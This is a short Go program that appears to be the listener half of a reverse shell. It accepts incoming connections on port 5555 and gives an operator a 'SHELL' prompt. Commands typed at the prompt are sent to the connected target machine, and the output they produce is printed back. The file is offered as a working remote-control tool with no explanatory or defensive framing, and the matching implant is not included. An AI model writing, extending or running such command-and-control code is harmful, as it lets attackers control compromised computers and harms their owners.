package main

import (
	"encoding/json"
	"fmt"
	"net"
	"strings"
    "bufio"
    "os"
    "github.com/TwiN/go-color"
)
func recv(conn net.Conn) string {
    data := "" 
    buffer := make([]byte, 2048)

   for {
       _, err := conn.Read(buffer)
       if err != nil {
           fmt.Println("Error", err)
       }
       
       data = strings.Trim(string(buffer), " ")

       err = json.Unmarshal([]byte(data), &data)
        
       return strings.ReplaceAll(data, string('"'), "") 
   }


}
func send(conn net.Conn, data string) {
    json, err := json.Marshal(data)
    if err != nil {
        fmt.Println("Error", err)
    }
    _, err = conn.Write(json)
}
func target_communication(conn net.Conn) {
    scanner := bufio.NewScanner(os.Stdin) 
    for {
        var command string  
        out := color.Colorize(color.Green, "SHELL ") +
        color.Colorize(color.Red, fmt.Sprintf("%s ", conn.RemoteAddr().(*net.TCPAddr).IP.String())) +
        "> "
        fmt.Print(out)
        scanner.Scan()
        command = scanner.Text()
        send(conn, command)
        if command == "quit" {
            return
        } else {
            result := recv(conn)
            result = strings.TrimRight(result, "\x00")
            result = strings.ReplaceAll(result, "\\n", " ")
            fmt.Println(result)
        }
    }

}
func main() {

    sock, err := net.Listen("tcp", ":5555")

    if err != nil {
        fmt.Println("Error", err) 
    }
    for {
        fmt.Println(color.Colorize(color.Blue,"[*] Waiting for Connection"))
        conn, err := sock.Accept()
        if err != nil {
            fmt.Print("Error", err)
        }
        
        fmt.Println(color.Colorize(color.Green, "[+] Connection"))
        target_communication(conn)
    }

}
